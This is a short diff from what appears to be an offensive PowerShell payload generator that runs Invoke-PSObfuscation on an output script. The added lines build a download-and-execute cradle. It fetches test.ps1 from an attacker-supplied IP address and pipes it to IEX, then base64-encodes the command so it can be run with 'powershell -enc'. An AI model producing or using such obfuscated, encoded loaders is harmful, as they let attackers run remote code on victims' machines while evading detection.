@@ -173,4 +173,12 @@ $PSobfuscation = Invoke-PSObfuscation -Path $currentDir/output-file.ps1 -Comment
 Write-Host "[OK]" -ForegroundColor Green ; Write-Host 
 
 
-Write-Host "`nOutput files: $fileName, 1.txt"
+Write-Host "`nOutput files: $fileName, 1.txt, $fileName1" -ForegroundColor Green ; Write-Host 
+
+Write-Host "Additionally generating powershell -enc payload:`n"
+
+$text = "(New-Object System.Net.WebClient).DownloadString('http://$Ipaddress/test.ps1') | IEX "
+$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
+$EncodedText = [Convert]::ToBase64String($bytes)
+$EncodedText
+
